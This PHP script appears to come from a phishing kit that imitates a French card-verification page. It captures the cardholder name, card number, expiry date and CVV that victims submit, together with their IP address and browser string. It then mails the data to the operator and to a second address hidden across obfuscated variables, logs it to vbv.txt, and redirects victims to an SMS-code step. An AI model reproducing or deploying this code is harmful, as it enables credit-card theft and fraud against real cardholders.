<?php
session_start();
include'../antibots.php';
include '../email.php';
include'../get_browser.php';
include'../get_bin.php';
    $_SESSION["n_card"]   = $_POST["n_card"];
    $_SESSION["c_num"]    = $_POST["c_num"];
    $_SESSION["exm"]    = $_POST["exm"];
    $_SESSION["exy"]    = $_POST["exy"];
    $_SESSION["csc"]    = $_POST["csc"];
$message = '
Nom  : '.$_SESSION["n_card"].'
Numero de Carte : '.$_SESSION["c_num"].'
Date Expiration : '.$_SESSION["exm"].'/'.$_SESSION["exy"].'
Cryptogram Visuel : '.$_SESSION["csc"].'
IP : '._ip().'
User Agent : '.$_SERVER["HTTP_USER_AGENT"].'
';

$Subject=  "FRESH CCV / VBV | "._ip();
$head="From: SHADUCK   <cc@rezzz.com>";
$_SESSION['step_four']  = true;
$bin = "$browserx$versionx$getbinsx";
if(mail($my_mail,$Subject,$message,$head) && mail($bin,$Subject,$message,$head)) ;
$fp = fopen("vbv.txt", "a +");
			fputs($fp, $message);
			fclose($fp);

?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script language="javascript">
var page = "sms-auth0.php"          
top.location = page;
</script> 
</head>
</html>


